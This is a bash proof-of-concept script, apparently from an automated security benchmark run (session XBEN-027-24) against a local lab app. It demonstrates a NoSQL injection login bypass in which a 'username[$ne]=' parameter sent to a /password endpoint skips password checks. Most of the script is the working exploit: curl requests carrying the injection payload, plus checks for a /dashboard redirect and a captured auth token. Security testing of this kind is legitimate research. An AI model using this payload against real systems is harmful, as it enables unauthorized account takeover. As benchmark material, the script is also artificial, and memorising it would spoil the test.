#!/bin/bash
# POC: NoSQL Injection Authentication Bypass via Username Parameter - Demonstrates $ne operator bypassing password validation in /password endpoint
# Target: ./repo
# Created: 2025-11-04T20:08:44.945Z
# Session: benchmark-XBEN-027-24-mhkzunic

# NoSQL Injection Authentication Bypass POC
# Target: /password/{username} endpoint
# Vulnerability: NoSQL injection via bracket notation parameter parsing
# The $ne (not equal) operator matches any username that is not empty, bypassing password validation

TARGET_URL="http://localhost:8080"
ENDPOINT="/password/test"

echo "============================================"
echo "NoSQL Injection Authentication Bypass POC"
echo "============================================"
echo ""

# Test 1: Normal authentication with wrong password (should fail)
echo "[*] Test 1: Normal authentication attempt with wrong password"
echo "[*] Command: curl -X POST ${TARGET_URL}${ENDPOINT} -d 'username=test&user_id=10032&password=wrongpass' -i -L"
echo ""

RESPONSE1=$(curl -s -i -L -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=test&user_id=10032&password=wrongpass" 2>&1)

echo "$RESPONSE1"
echo ""
echo "[*] Expected: HTTP 302 with Location: /?error=Incorrect+password (authentication failure)"
echo ""

# Extract location header
LOCATION1=$(echo "$RESPONSE1" | grep -i "^Location:" | head -1 | sed 's/Location: //I' | tr -d '\r')
if [[ "$LOCATION1" == *"error=Incorrect"* ]]; then
  echo "[+] CONFIRMED: Normal authentication with wrong password fails as expected"
else
  echo "[-] Location header: $LOCATION1"
fi

echo ""
echo "---"
echo ""

# Test 2: NoSQL injection bypass with $ne operator
echo "[*] Test 2: NoSQL Injection bypass attempt using username[\$ne]= parameter"
echo "[*] Command: curl -X POST ${TARGET_URL}${ENDPOINT} -d 'username[\$ne]=&user_id=10032&password=test' -i -L"
echo ""

RESPONSE2=$(curl -s -i -L -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username[\$ne]=&user_id=10032&password=test" 2>&1)

echo "$RESPONSE2"
echo ""
echo "[*] Expected: HTTP 302 with Location: /dashboard (authentication bypass success)"
echo ""

# Extract location header and auth token
LOCATION2=$(echo "$RESPONSE2" | grep -i "^Location:" | head -1 | sed 's/Location: //I' | tr -d '\r')
AUTH_TOKEN=$(echo "$RESPONSE2" | grep -i "auth_token" | head -1)

if [[ "$LOCATION2" == *"/dashboard"* ]]; then
  echo "[+] SUCCESS: NoSQL injection bypass worked! Redirected to: $LOCATION2"
  if [[ -n "$AUTH_TOKEN" ]]; then
    echo "[+] Authentication token set: $AUTH_TOKEN"
  fi
  echo ""
  echo "[+] VULNERABILITY CONFIRMED: Attacker can bypass authentication without knowing password"
  exit 0
else
  echo "[-] Location header: $LOCATION2"
  echo "[-] Vulnerability not confirmed or target not vulnerable"
  exit 1
fi